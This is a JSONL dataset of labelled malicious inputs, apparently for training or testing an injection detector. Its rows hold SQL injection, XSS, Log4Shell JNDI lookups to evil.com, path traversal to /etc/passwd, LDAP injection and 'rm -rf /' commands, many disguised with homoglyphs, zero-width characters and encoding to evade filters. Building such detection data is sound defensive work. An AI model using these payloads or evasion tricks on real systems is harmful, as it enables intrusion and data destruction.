+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION\\x20SELECT\\x20null,\\x20null,\\x20null\\x20FROM\\x20information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION SELECT null, null, null FROM information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('malicious    code')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "eval('malicious    code')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm    -rf    /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​ -rf ​/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm​ -rf /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')​", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​ -rf ​/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION  SELECT  null,  null,  null  FROM  informаtion_schemа.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')​", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION    SELECT    null,    null,    null    FROM    informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​ -rf /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "UNION SELECT null, null, null FROM informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION SELECT null, null, null FROM information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtimе.getRuntime().exec('rm​  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION​ SELECT null, null, null FROM information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION SELECT null, null, null FROM information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
